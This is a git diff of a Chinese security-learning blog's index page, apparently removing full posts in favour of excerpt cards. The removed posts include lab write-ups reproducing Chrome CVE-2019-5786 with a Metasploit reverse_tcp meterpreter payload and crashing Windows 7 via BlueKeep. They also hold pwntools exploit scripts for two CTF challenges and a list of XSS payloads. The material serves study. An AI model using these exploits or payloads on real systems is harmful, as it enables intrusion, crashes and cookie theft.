+              <a href="/SinkyQ/SinkyQ.github.io.git/tags/pikachu/">#pikachu</a>
+            
+          </div>
+        
+      </div>
+    </article>
   </div>
-  
-</article>
 
-
-
-
-
-
-
-  
-    <article id="post-CVE-2019-5786" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/CVE-2019-5786/" class="article-date">
-  	<time datetime="2022-08-09T08:02:35.739Z" itemprop="datePublished">2022-08-09</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
+  <div class="row mx-auto index-card">
     
     
-      <header class="article-header">
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h1 class="index-header">
         
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/CVE-2019-5786/">
-        CVE-2019-5786
-        
+        <a href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/pikachu-CSRF/" target="_self">
+          pikachu-CSRF
+        </a>
+      </h1>
+
+      
+      <a class="index-excerpt index-excerpt__noimg" href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/pikachu-CSRF/" target="_self">
+        <div>
+          CSRFCSRF 跨站请求伪造，在csrf攻击场景中攻击者会伪造一个请求，欺骗目标用户进行点击，用户一旦点击这个请求，整个攻击就完成了，所以csrf攻击也成为”one click”攻击. csrf攻击满足的条件1、网站没有对个人的信息修改的请求进行防csrf处理，导致请求容易被伪造 2.用户在登录后台的情况下，点击了攻击者发送的链接，如果用户没登陆或没点连接都不会成 csrf与xss的区别csrf
+        </div>
       </a>
-    </h1>
-  
 
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>前言：</p>
-<p>这个漏洞是我第一个自己进行复现和尝试写exp的洞，我希望在未来我能够对于复现漏洞和写exp能像吃饭喝水一样自信！加油！</p>
-<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>kali</p>
-<p>win7_x86</p>
-<p>Google_chrome_(32bit)_v72.0.3626.119</p>
-<p>浏览下载链接推荐：<a target="_blank" rel="noopener" href="https://dl.google.com/release2/chrome/AMavr_Q0teHn_72.0.3626.119/72.0.3626.119_chrome_installer.exe">https://dl.google.com/release2/chrome/AMavr_Q0teHn_72.0.3626.119/72.0.3626.119_chrome_installer.exe</a></p>
-<h2 id="复现："><a href="#复现：" class="headerlink" title="复现："></a>复现：</h2><p>kali启动msf,搜索chrome_filereader利用模块。(据谷歌官方公示，CVE-2019-5786是位于FileReader中的UAF漏洞)</p>
-<pre><code>root@kali:~# msfconsole -q
-msf5 &gt; search chrome_filereader
-</code></pre>
-<blockquote>
-<p>注：<br>1.<code>msfconsole -q</code>  是指启动工具msf，-q 不打印没用的东西出来（msf启动界面）之后可能需要专门整理一下有关msf工具的知识。<br>2.<code>search chrome_filereader</code>正则匹配搜索exp。exp存在则浮现。<br>3.什么是UAF漏洞：内存破坏漏洞，通常存在于浏览器中，详细可见博客文章“UAF漏洞简单学习”</p>
-</blockquote>
-<p>出现exp: <code>exploit/filereader/browser/chrome_filereader_uaf</code></p>
-<p><img src="https://i.loli.net/2020/05/25/IcHhEGVmKiTvxyz.png" alt="捕获.PNG"></p>
-<h3 id="简单了解FileReader对象的用法"><a href="#简单了解FileReader对象的用法" class="headerlink" title="简单了解FileReader对象的用法"></a>简单了解FileReader对象的用法</h3><p>Filereader 可以实现对文件内容或者缓冲区数（Blob）的异步读取</p>
-<ul>
-<li><p>readyState：表示读取状态</p>
-<ul>
-<li>empty,0,尚未读取</li>
-<li>loading,1,正在读取</li>
-<li>done,2,读取完成</li>
-</ul>
-</li>
-<li><p>result：表示读取结果，具体格式与读取方式有关：</p>
-<ul>
-<li>readAsArrayBuffer</li>
-<li>readAsBinaryString</li>
-<li>readAsDataURL</li>
-<li>readAsText</li>
-</ul>
-</li>
-<li><p>onprogress：回调函数</p>
-<ul>
-<li>读取Blob触发</li>
-<li>当数据较多时会周期性触发多次</li>
-</ul>
-</li>
-<li><p>onloadend：回调函数</p>
-<ul>
-<li>读取操作完成时触发，不论读取成功或失败</li>
-</ul>
-</li>
-</ul>
-<p>查看模块信息</p>
-<p><img src="https://i.loli.net/2020/05/25/dT2WQNsPg4qaBZH.png" alt="捕获.PNG"></p>
-<p>漏洞介绍：</p>
-<pre><code>Payload information:
-Description:
-  This exploit takes advantage of a use after free vulnerability in 
-  Google Chrome 72.0.3626.119 running on Windows 7 x86. The 
-  FileReader.readAsArrayBuffer function can return multiple references 
-  to the same ArrayBuffer object, which can be freed and overwritten 
-  with sprayed objects. The dangling ArrayBuffer reference can be used 
-  to access the sprayed objects, allowing arbitrary memory access from 
-  Javascript. This is used to write and execute shellcode in a 
-  WebAssembly object. The shellcode is executed within the Chrome 
-  sandbox, so you must explicitly disable the sandbox for the payload 
-  to be successful.
-</code></pre>
-<p>选择payload</p>
-<pre><code>-&gt; set payload windows/meterpreter/reverse_tcp
-</code></pre>
-<blockquote>
-<p>注：meterpreter/reverse_tcp：基于TCP的反向链接反弹shell，详细见文章“初识Meterpreter”</p>
-</blockquote>
-<p>设置payload参数：LHOST为kali ip</p>
-<pre><code>-&gt; set LHOST 192.168.119.128
-</code></pre>
-<p><img src="https://i.loli.net/2020/05/25/chvQmOGL1Kqgebs.png" alt="捕获.PNG"></p>
-<p>创建服务 <code>-&gt; set payload windows/meterpreter/reverse_tcp</code></p>
-<p><img src="https://i.loli.net/2020/05/25/bNlUIHPxwkXcsrn.png" alt="捕获.PNG"></p>
-<p>启动服务：run 或者exploit</p>
-<p>在win7下进入chrome文件目录，在目录下进去cmd，并以沙箱关闭状态执行chrome.exe</p>
-<pre><code>-&gt; chrome.exe --no-sandbox
-</code></pre>
-<p>在弹出的chome浏览器中访问kali ip: <a target="_blank" rel="noopener" href="http://192.168.119.128:8080/">http://192.168.119.128:8080</a></p>
-<p>kali获得sessions<br>查看sessions序号，通过反弹shell在win7上可执行命令。<br>复现结束。</p>
-<h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>在获取session时候我遇见了很多小问题导致我不能获取，比如win7应该是x86系统，比如win7的防火墙忘记关闭了，比如网速太慢，在历经无数崩溃瞬间我成功的获取了session.<br>虽然后来再整理wp的时候，win7系统由于自动更新，chrome119版本也升级了，后来再安装却死活安装不上去，差点升天……</p>
-<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>exp太长了并且看不懂，等我后面有机会再整理。这边放其他大佬整理出来的exp。</p>
-<pre><code>https://github.com/exodusintel/CVE-2019-5786 
-</code></pre>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/SinkyQ/SinkyQ.github.io.git/tags/chrome-bug/" rel="tag">chrome_bug</a></li></ul>
-	</div>
-
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2022-08-09 16:30" pubdate>
+              2022-08-09
+            </time>
+          </div>
+        
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
+              <a href="/SinkyQ/SinkyQ.github.io.git/tags/pikachu/">#pikachu</a>
+            
+          </div>
+        
+      </div>
+    </article>
   </div>
-  
-</article>
 
-
-
-
-
-
-
-  
-    <article id="post-CVE-2019-0708" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/CVE-2019-0708/" class="article-date">
-  	<time datetime="2022-08-09T04:25:01.135Z" itemprop="datePublished">2022-08-09</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
+  <div class="row mx-auto index-card">
     
     
-      <header class="article-header">
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h1 class="index-header">
         
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/CVE-2019-0708/">
-        CVE-2019-0708
-        
+        <a href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/CVE-2019-5786/" target="_self">
+          CVE-2019-5786
+        </a>
+      </h1>
+
+      
+      <a class="index-excerpt index-excerpt__noimg" href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/CVE-2019-5786/" target="_self">
+        <div>
+          前言： 这个漏洞是我第一个自己进行复现和尝试写exp的洞，我希望在未来我能够对于复现漏洞和写exp能像吃饭喝水一样自信！加油！ 环境kali win7_x86 Google_chrome_(32bit)_v72.0.3626.119 浏览下载链接推荐：https:&#x2F;&#x2F;dl.google.com&#x2F;release2&#x2F;chrome&#x2F;AMavr_Q0teHn_72.0.3626.119&#x2F;72.0.3626
+        </div>
       </a>
-    </h1>
-  
 
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>2019年5月14日爆出CVE-2019-0708漏洞，高危漏洞，影响范围较广，通过远程桌面端口3389，RDP协议进行攻击。</p>
-<p>影响系统：windows 2003、windows 2008、windows 2008 R2、windows xp、win7</p>
-<h1 id="蓝屏"><a href="#蓝屏" class="headerlink" title="蓝屏"></a>蓝屏</h1><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>攻击机：kali IP：192.168.119.128</p>
-<p>靶机：win7 IP:192.168.119.139 (开放3389端口)</p>
-<p>工具：RDP漏洞扫描工具、MSF</p>
-<p>POC：<a href="https://github.com/n1xbyte/CVE-2019-0708">https://github.com/n1xbyte/CVE-2019-0708</a></p>
-<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>nmap对win7端口扫描:</p>
-<p><img src="https://i.loli.net/2020/07/13/Agj1dU2GY5JKZnW.png" alt="nmap扫描3389.PNG"></p>
-<p>RDP工具在win7上扫描靶机:<code>0708detector.exe -t 192.168.119.139 -p 3389</code></p>
-<p><img src="https://i.loli.net/2020/07/13/CwHJ1PRnel7cyu5.png" alt="漏扫工具扫描3389（win7自身）.PNG"></p>
-<p>启动MSF<br>查找漏洞： <code>search 0708</code></p>
-<p>利用漏洞扫描模块： <code>use auxiliary/scanner/rdp/cve_2019_0708_bluekeep</code></p>
-<p>查看参数： <code>show options</code></p>
-<p>设置靶机IP： <code>set rhosts 192.168.119.139</code></p>
-<p>运行：<code>run</code></p>
-<h3 id="漏洞攻击"><a href="#漏洞攻击" class="headerlink" title="漏洞攻击"></a>漏洞攻击</h3><p>在kali中安装pip3,安装impacket库。下载poc。<br>切进目录CVE-2019-0708</p>
-<p>开始攻击： <code>python3 crashpoc.py 192.168.119.139 64(系统类型)</code></p>
-<p>攻击成功，win7变为蓝屏。</p>
-<p><img src="https://i.loli.net/2020/07/13/UN9urvOaMQxEDoC.png" alt="win7蓝屏.PNG"></p>
-<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><h4 id="RDP协议"><a href="#RDP协议" class="headerlink" title="RDP协议"></a>RDP协议</h4><p>RDP,远程显示协议。传输方式：tcp/ip。提供了客户和服务器之间的连接。映像会话。<br>基本层次结构：</p>
-<ul>
-<li>网络连接层：RDP协议建立在tcp/ip协议之上，由于传输的数据量比较大，因此在协议的底层首先定义一层网络连接层，它定义了一个完整的RDP数据逻辑包，以避免由于网络包长度过长而被分割使数据丢失。</li>
-<li>ISO数据层：在网络连接层之上是ISO数据层，标识RDP数据的正常连接通信。</li>
-<li>虚拟通道层：在ISO数据层之上，RDP协议定义一个虚拟通道层，用以拆分标示不同虚拟通道的数据，加快客户端处理速度，节省占用网络接口的时间。</li>
-<li>加密解密层：在虚拟通道层之上，RDP定义一个数据加密解密层，此层用于对所有的功能数据进行加密解密处理。</li>
-<li>功能数据层：在加密解密层之上是功能数据，画面信息，本地资源转换，声音数据，打印数据等所有的功能数据信息都在此层进行处理。另外，根据数据类型的不同，这些数据都有各自不同层次的分割，</li>
-</ul>
-<p>连接过程说明：</p>
-<ul>
-<li>客户端连接服务器</li>
-<li>ISO数据层建立连接</li>
-<li>发送初始协议相关信息，接收加密、解密秘钥</li>
-<li>虚拟通道申请</li>
-<li>加密形式发送客户端系统信息，同时验证加密协议</li>
-<li>平台软件证书验证</li>
-<li>各功能建立连接，各功能数据传输，功能实现。</li>
-</ul>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/SinkyQ/SinkyQ.github.io.git/tags/windows%E6%BC%8F%E6%B4%9E/" rel="tag">windows漏洞</a></li></ul>
-	</div>
-
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2022-08-09 16:02" pubdate>
+              2022-08-09
+            </time>
+          </div>
+        
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
+              <a href="/SinkyQ/SinkyQ.github.io.git/tags/chrome-bug/">#chrome_bug</a>
+            
+          </div>
+        
+      </div>
+    </article>
   </div>
-  
-</article>
 
-
-
-
-
-
-
-  
-    <article id="post-攻防世界-pwn-反应釜开关控制" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-%E5%8F%8D%E5%BA%94%E9%87%9C%E5%BC%80%E5%85%B3%E6%8E%A7%E5%88%B6/" class="article-date">
-  	<time datetime="2022-08-09T04:18:04.404Z" itemprop="datePublished">2022-08-09</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
+  <div class="row mx-auto index-card">
     
     
-      <header class="article-header">
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h1 class="index-header">
         
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-%E5%8F%8D%E5%BA%94%E9%87%9C%E5%BC%80%E5%85%B3%E6%8E%A7%E5%88%B6/">
-        攻防世界-pwn-反应釜开关控制
-        
+        <a href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/CVE-2019-0708/" target="_self">
+          CVE-2019-0708
+        </a>
+      </h1>
+
+      
+      <a class="index-excerpt index-excerpt__noimg" href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/CVE-2019-0708/" target="_self">
+        <div>
+          2019年5月14日爆出CVE-2019-0708漏洞，高危漏洞，影响范围较广，通过远程桌面端口3389，RDP协议进行攻击。 影响系统：windows 2003、windows 2008、windows 2008 R2、windows xp、win7 蓝屏环境攻击机：kali IP：192.168.119.128 靶机：win7 IP:192.168.119.139 (开放3389端口) 工具：
+        </div>
       </a>
-    </h1>
-  
 
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec:"></a>checksec:</h2><p><img src="https://i.loli.net/2020/07/15/3D5qjSLvGN2CJzT.png" alt="checksec.PNG"></p>
-<ul>
-<li>可以修改GOT表</li>
-<li>可以通过一处的方式来更改程序运行流</li>
-<li>堆栈不可执行</li>
-<li>地址随机化未开启</li>
-</ul>
-<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>IDA查看，发现有/bin/sh。</p>
-<p><img src="https://i.loli.net/2020/07/15/wLf32ASzvt5brWm.png" alt="shell.PNG"></p>
-<p>get函数可溢出，偏移由v5得0x200h+0x8h(偏移对齐)=0x208h</p>
-<p><img src="https://i.loli.net/2020/07/15/9mZH7GCz2u8LJq5.png" alt="v5.PNG"></p>
-<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>exp:</p>
-<p><code> from pwn import * r = remote('220.249.52.133',39331) elf = ELF('./control') shell_addr = 0x04005F6 payload = 'A'*0x208 + p64(shell_addr) r.sendline(payload) r.interactive()</code></p>
-<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>看了一下大佬的wp，结果原来是盲打题……</p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/SinkyQ/SinkyQ.github.io.git/tags/pwn/" rel="tag">pwn</a></li></ul>
-	</div>
-
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2022-08-09 12:25" pubdate>
+              2022-08-09
+            </time>
+          </div>
+        
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
+              <a href="/SinkyQ/SinkyQ.github.io.git/tags/windows%E6%BC%8F%E6%B4%9E/">#windows漏洞</a>
+            
+          </div>
+        
+      </div>
+    </article>
   </div>
-  
-</article>
 
-
-
-
-
-
-
-  
-    <article id="post-有关XSS跨站脚本" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/%E6%9C%89%E5%85%B3XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/" class="article-date">
-  	<time datetime="2022-08-09T04:10:35.381Z" itemprop="datePublished">2022-08-09</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
+  <div class="row mx-auto index-card">
     
     
-      <header class="article-header">
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h1 class="index-header">
         
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/%E6%9C%89%E5%85%B3XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/">
-        有关XSS跨站脚本
-        
+        <a href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-%E5%8F%8D%E5%BA%94%E9%87%9C%E5%BC%80%E5%85%B3%E6%8E%A7%E5%88%B6/" target="_self">
+          攻防世界-pwn-反应釜开关控制
+        </a>
+      </h1>
+
+      
+      <a class="index-excerpt index-excerpt__noimg" href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-%E5%8F%8D%E5%BA%94%E9%87%9C%E5%BC%80%E5%85%B3%E6%8E%A7%E5%88%B6/" target="_self">
+        <div>
+          checksec:  可以修改GOT表 可以通过一处的方式来更改程序运行流 堆栈不可执行 地址随机化未开启  分析IDA查看，发现有&#x2F;bin&#x2F;sh。  get函数可溢出，偏移由v5得0x200h+0x8h(偏移对齐)&#x3D;0x208h  expexp:  from pwn import * r &#x3D; remote(&#39;220.249.52.133&#39;,39331) elf &#x3D; ELF(&#39;.&#x2F;control&#39;
+        </div>
       </a>
-    </h1>
-  
 
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="XSS-跨站脚本-原理与分类"><a href="#XSS-跨站脚本-原理与分类" class="headerlink" title="XSS(跨站脚本)原理与分类"></a>XSS(跨站脚本)原理与分类</h1><p>跨站脚本攻击XSS,为了不和层叠样式表的缩写混淆，故将跨站脚本攻击缩写为XSS,恶意攻击者往web页面里插入恶意script代码，当用户浏览页面时嵌入其中的script代码被执行，从而恶意攻击用户。</p>
-<p>XSS攻击针对的是用户层面的攻击.</p>
-<ul>
-<li>反射型：交互的数据一般不会被存在数据库里，一次性，一般出现在查询页面等。</li>
-<li>存储型：交互的数据会被存在数据库里面，永久性存储，一般出现在留言板，注册等页面。</li>
-<li>DOM型：不与后台服务器产生数据交互，是一种通过DOM操作前端代码输出的时候产生的问题，一次性，也属于反射型。</li>
-</ul>
-<h1 id="XSS漏洞测试流程"><a href="#XSS漏洞测试流程" class="headerlink" title="XSS漏洞测试流程"></a>XSS漏洞测试流程</h1><p>1.在目标上找输入点，比如查询接口、留言板</p>
-<p>2.输入一组“特殊字符（&gt;,’,”等）+唯一识别字符”，点击提交后，查看返回源码，看后端返回数据是否有处理。</p>
-<p>3.通过搜索定位到唯一字符，结合唯一字符前后语法确定是否可以构造执行js的调教（构造闭合）</p>
-<p>4.提交构造的脚本代码（以及各种绕过姿势），看是否可以成功执行，成功执行证明存在xss漏洞。</p>
-<h1 id="XSS的攻击载荷"><a href="#XSS的攻击载荷" class="headerlink" title="XSS的攻击载荷"></a>XSS的攻击载荷</h1><ul>
-<li><code>&lt;script&gt;</code>：最直接的xss有效载荷，脚本标记可以引用外部的javascript代码，也可以将代码插入脚本标记中。</li>
-</ul>
-<pre><code class="<script">&lt;script&gt;alert("hack")&lt;/script&gt; #弹出hack
-&lt;script&gt;alert(document.cookie)&lt;/script&gt; #弹出cookie
-</code></pre>
-<ul>
-<li><code>&lt;img&gt;</code>：</li>
-</ul>
-<pre><code>&lt;img  src=1  onerror=alert("hack")&gt;
-&lt;img  src=1  onerror=alert(/hack/)&gt;
-&lt;img  src=1  onerror=alert(document.cookie)&gt;  #弹出cookie
-&lt;img  src=1  onerror=alert(123)&gt;      注：对于数字，可以不用引号
-&lt;img  src="javascript:alert("XSS");"&gt;
-&lt;img  dynsrc="javascript:alert('XSS')"&gt;
-&lt;img  lowsrc="javascript:alert('XSS')"&gt;
-</code></pre>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/SinkyQ/SinkyQ.github.io.git/tags/XSS/" rel="tag">XSS</a></li></ul>
-	</div>
-
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2022-08-09 12:18" pubdate>
+              2022-08-09
+            </time>
+          </div>
+        
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
+              <a href="/SinkyQ/SinkyQ.github.io.git/tags/pwn/">#pwn</a>
+            
+          </div>
+        
+      </div>
+    </article>
   </div>
-  
-</article>
 
-
-
-
-
-
-
-  
-    <article id="post-攻防世界-pwn-dice_game" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-dice_game/" class="article-date">
-  	<time datetime="2022-08-09T04:08:11.395Z" itemprop="datePublished">2022-08-09</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
+  <div class="row mx-auto index-card">
     
     
-      <header class="article-header">
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h1 class="index-header">
         
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-dice_game/">
-        攻防世界-dice_game
-        
+        <a href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/%E6%9C%89%E5%85%B3XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/" target="_self">
+          有关XSS跨站脚本
+        </a>
+      </h1>
+
+      
+      <a class="index-excerpt index-excerpt__noimg" href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/%E6%9C%89%E5%85%B3XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/" target="_self">
+        <div>
+          XSS(跨站脚本)原理与分类跨站脚本攻击XSS,为了不和层叠样式表的缩写混淆，故将跨站脚本攻击缩写为XSS,恶意攻击者往web页面里插入恶意script代码，当用户浏览页面时嵌入其中的script代码被执行，从而恶意攻击用户。 XSS攻击针对的是用户层面的攻击.  反射型：交互的数据一般不会被存在数据库里，一次性，一般出现在查询页面等。 存储型：交互的数据会被存在数据库里面，永久性存储，一般出现在
+        </div>
       </a>
-    </h1>
-  
 
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="0x01-Checksec"><a href="#0x01-Checksec" class="headerlink" title="0x01 Checksec"></a>0x01 Checksec</h2><p>linux下checksec查壳，开启了relro nx pie防护：</p>
-<p><img src="https://i.loli.net/2020/07/23/z2ZEWmAGM3POHqt.png" alt="pwn-checksec.PNG"></p>
-<h2 id="0x02-分析"><a href="#0x02-分析" class="headerlink" title="0x02 分析"></a>0x02 分析</h2><p>IDA打开，主函数：</p>
-<pre><code>__int64 __fastcall main(__int64 a1, char **a2, char **a3)
-{
-  char buf[55]; // [rsp+0h] [rbp-50h]
-  char v5; // [rsp+37h] [rbp-19h]
-  ssize_t v6; // [rsp+38h] [rbp-18h]
-  unsigned int seed[2]; // [rsp+40h] [rbp-10h]
-  unsigned int v8; // [rsp+4Ch] [rbp-4h]
-  memset(buf, 0, 0x30uLL);
-  *(_QWORD *)seed = time(0LL);
-  printf("Welcome, let me know your name: ", a2);
-  fflush(stdout);
-  v6 = read(0, buf, 0x50uLL);
-  if ( v6 &lt;= 49 )
-    buf[v6 - 1] = 0;
-  printf("Hi, %s. Let's play a game.\n", buf);
-  fflush(stdout);
-  srand(seed[0]);
-  v8 = 1;
-  v5 = 0;
-  while ( 1 )
-  {
-    printf("Game %d/50\n", v8);
-    v5 = sub_A20();
-    fflush(stdout);
-    if ( v5 != 1 )
-      break;
-    if ( v5 )
-    {
-      if ( v8 == 50 )
-      {
-        sub_B28(buf);
-        break;
-      }
-      ++v8;
-    }
-  }
-  puts("Bye bye!");
-  return 0LL;
-}
-</code></pre>
-<p>是一个srand函数程序，输入与随机出来的数匹配，则将进入flag的函数。</p>
-<pre><code>int __fastcall sub_B28(__int64 a1)
-{
-  char s; // [rsp+10h] [rbp-70h]
-  FILE *stream; // [rsp+78h] [rbp-8h]
-  printf("Congrats %s\n", a1);
-  stream = fopen("flag", "r");
-  fgets(&amp;s, 100, stream);
-  puts(&amp;s);
-  return fflush(stdout);
-}
-</code></pre>
-<p>在输入name时，令输入数据覆盖srand函数内部随机种子，就可以控制随机数的生成。</p>
-<p><img src="https://i.loli.net/2020/07/23/fxEhB6bCWcH9enR.png" alt="相差40.PNG"></p>
-<p>随机树种子地址与输入名字的buf地址之间相差0x40,所以将seed覆盖掉</p>
-<h2 id="0x03-exp"><a href="#0x03-exp" class="headerlink" title="0x03 exp"></a>0x03 exp</h2><pre><code>from pwn import *
-from ctypes import *
-p=remote('220.249.52.133',34691)
-libc=cdll.LoadLibrary("libc.so.6")
-p.recv()
-payload=0x40*'a'+p64(0)
-p.sendline(payload)
-a=[]
-for i in range(50):
-    a.append(libc.rand()%6+1)
-print(a)
-for i in a:
-    p.recv()
-    print(p.recv())
-    p.sendline(str(i))
-p.interactive()
-</code></pre>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/SinkyQ/SinkyQ.github.io.git/tags/pwn/" rel="tag">pwn</a></li></ul>
-	</div>
-
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2022-08-09 12:10" pubdate>
+              2022-08-09
+            </time>
+          </div>
+        
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
+              <a href="/SinkyQ/SinkyQ.github.io.git/tags/XSS/">#XSS</a>
+            
+          </div>
+        
+      </div>
+    </article>
   </div>
-  
-</article>
 
-
-
-
-
-
-
-  
-    <article id="post-攻防世界pwn-string" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-string/" class="article-date">
-  	<time datetime="2022-08-09T04:06:35.328Z" itemprop="datePublished">2022-08-09</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
+  <div class="row mx-auto index-card">
     
     
-      <header class="article-header">
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h1 class="index-header">
         
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-string/">
-        攻防世界 string
-        
+        <a href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-dice_game/" target="_self">
+          攻防世界-dice_game
+        </a>
+      </h1>
+
+      
+      <a class="index-excerpt index-excerpt__noimg" href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-dice_game/" target="_self">
+        <div>
+          0x01 Checkseclinux下checksec查壳，开启了relro nx pie防护：  0x02 分析IDA打开，主函数： 123456789101112131415161718192021222324252627282930313233343536373839__int64 __fastcall main(__int64 a1, char **a2, char **a3){  cha
+        </div>
       </a>
-    </h1>
-  
 
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>checksec 查看保护机制</p>
